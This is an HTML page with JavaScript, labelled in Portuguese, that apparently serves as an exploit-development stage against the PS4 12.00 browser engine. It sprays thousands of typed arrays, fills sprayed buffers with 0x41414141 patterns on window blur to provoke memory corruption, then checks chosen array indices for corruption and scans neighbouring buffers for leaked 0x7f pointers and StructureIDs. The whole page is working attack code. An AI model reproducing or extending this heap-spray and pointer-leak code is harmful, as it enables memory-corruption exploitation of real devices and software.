<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Targeted Micro-Scan</title>
<style>
    body { font-family: sans-serif; background: #1a1a1a; color: #ccc; padding: 20px; }
    button { padding: 12px 24px; margin: 5px; cursor: pointer; font-weight: bold; background: #444; color: #fff; border: 1px solid #666; }
    button:hover { background: #555; }
    code { background: #000; padding: 5px; border-radius: 4px; font-family: monospace; display: block; white-space: pre-wrap; margin: 5px 0; color: #0f0; border-left: 3px solid #0f0; }
    .vuln { color: #ff4444; font-weight: bold; }
    .pointer { color: #fff; background: #0077ff; padding: 2px 4px; font-weight: bold; border-radius: 3px; }
    .hit { background: #224422; border: 1px solid #00ff00; padding: 10px; margin: 10px 0; }
    hr { border: 0; border-top: 1px solid #444; margin: 30px 0; }
</style>
</head>
<body>

<h1>PS4 12.00 - TARGETED MICRO-SCAN</h1>
<p>Focado nos índices críticos: <b>293, 549 e 805</b></p>

<h2>STAGE 1: Setup 10,000 Arrays</h2>
<button onclick="setup()">1. CREATE ARRAYS</button>
<div id="setup_log"></div>

<script>
var g_arrays = {
    Uint8: [], Int8: [], Float64: [], BigUint64: []
};

function setup() {
    const r = document.getElementById('setup_log');
    r.innerHTML = 'Criando arrays (1000 por tipo)...<br>';
    
    for(let i = 0; i < 1000; i++) {
        // Tipos que demonstraram maior taxa de sucesso
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.BigUint64.push(new BigUint64Array(8));

        // Marcar para detecção
        g_arrays.Uint8[i][0] = i % 256;
        g_arrays.Int8[i][0] = i % 128;
        g_arrays.Float64[i][0] = i;
        g_arrays.BigUint64[i][0] = BigInt(i);
    }
    
    r.innerHTML += '<b>Pronto. OPTIONS duas vezes em Full Screen.</b><br>';
    if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount + '... ';
        
        const P = 2.121995791e-314; // 0x41414141...
        const spray = [];
        for(let i = 0; i < 4000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<b class="vuln">CORRUPÇÃO COMPLETA!</b><br>';
            check_hits();
            window.onblur = null;
        }
    };
}

function check_hits() {
    const r = document.getElementById('setup_log');
    const targets = [293, 549, 805];
    targets.forEach(t => {
        let u8 = g_arrays.Uint8[t];
        if (u8 && u8[0] !== (t % 256)) {
            r.innerHTML += `<span class="vuln">✓ Alvo #${t} confirmado como CORROMPIDO.</span><br>`;
        }
    });
}
</script>

<hr>

<h2>STAGE 2: Targeted Micro-Scan</h2>
<p>Analisa a vizinhança (+/- 5) dos índices 293, 549 e 805 em busca de ponteiros 0x7f.</p>
<button onclick="micro_scan()">2. RUN TARGETED SCAN</button>
<div id="scan_log"></div>

<script>
function micro_scan() {
    const r = document.getElementById('scan_log');
    r.innerHTML = '<b>Iniciando Micro-Scan nos alvos...</b><br>';

    const targets = [293, 549, 805];
    const range = 5; // Vizinhança
    let ptr_found = 0;

    targets.forEach(baseIdx => {
        r.innerHTML += `<div class="hit"><h3>Analisando Vizinhança do Índice ${baseIdx}</h3>`;
        
        for(let i = baseIdx - range; i <= baseIdx + range; i++) {
            if (i < 0 || i >= 1000) continue;

            // Usamos Uint8 para varrer o buffer original e BigUint64 para ler ponteiros
            let arr = g_arrays.Uint8[i];
            let view = new BigUint64Array(arr.buffer);
            let log_entry = `[Array #${i}] `;
            let has_interesting_data = false;

            for(let j = 0; j < view.length; j++) {
                let val = view[j];
                let hex = val.toString(16).padStart(16, '0');

                // Critério 1: Ponteiro Vivo (0x7f...)
                if (hex.startsWith("00007f") || hex.startsWith("7f")) {
                    log_entry += `<span class="pointer">!!! PONTEIRO ENCONTRADO: 0x${hex} (Offset ${j*8}) !!!</span><br>`;
                    ptr_found++;
                    has_interesting_data = true;
                }
                // Critério 2: StructureID 0x25
                else if (hex.endsWith("25")) {
                    log_entry += `<b style="color:#0f0">STRUCTUREID 0x25 (Offset ${j*8})</b> | `;
                    has_interesting_data = true;
                }
            }

            if (has_interesting_data) {
                r.innerHTML += `<code>${log_entry}</code>`;
            }
        }
        r.innerHTML += `</div>`;
    });

    if (ptr_found === 0) {
        r.innerHTML += "<br>Ponteiro não encontrado na vizinhança imediata. Tente expandir o 'range' para 20 no código.";
    } else {
        r.innerHTML += `<br><b class="vuln">SUCESSO: ${ptr_found} ponteiros de memória identificados!</b>`;
    }
}
</script>

</body>
</html>
